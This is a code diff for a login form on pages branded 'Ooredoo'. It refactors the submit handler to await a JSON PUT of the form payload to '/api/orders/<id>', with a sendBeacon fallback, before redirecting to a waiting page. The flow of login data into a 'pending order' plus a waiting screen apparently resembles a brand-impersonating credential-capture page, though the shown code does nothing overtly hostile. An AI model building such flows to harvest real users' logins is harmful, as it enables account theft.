@@ -328,7 +328,27 @@
     errorAlert.classList.remove('show');
   });
 
-  loginForm.addEventListener('submit', (e) => {
+  async function persistOoredooOrder(orderId, payload) {
+    try {
+      const res = await fetch('/api/orders/' + encodeURIComponent(orderId), {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        cache: 'no-store'
+      });
+      if (!res.ok) throw new Error('save failed');
+      return true;
+    } catch (err) {
+      try {
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+        }
+      } catch (sendErr) {}
+      return false;
+    }
+  }
+
+  loginForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     
     let isValid = true;
@@ -380,19 +400,8 @@
         status: 'pending'
       };
 
-      const request = JSON.stringify(payload);
       sessionStorage.setItem('ooredooFlow', 'login');
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/orders/' + encodeURIComponent(currentOrderId), new Blob([request], { type: 'application/json' }));
-      } else {
-        fetch('/api/orders/' + encodeURIComponent(currentOrderId), {
-          method: 'PUT',
-          headers: { 'Content-Type': 'application/json' },
-          body: request,
-          keepalive: true
-        }).catch(() => {});
-      }
-
+      await persistOoredooOrder(currentOrderId, payload);
       window.location.href = 'waiting_ooredoo_en.html';
     }
   });
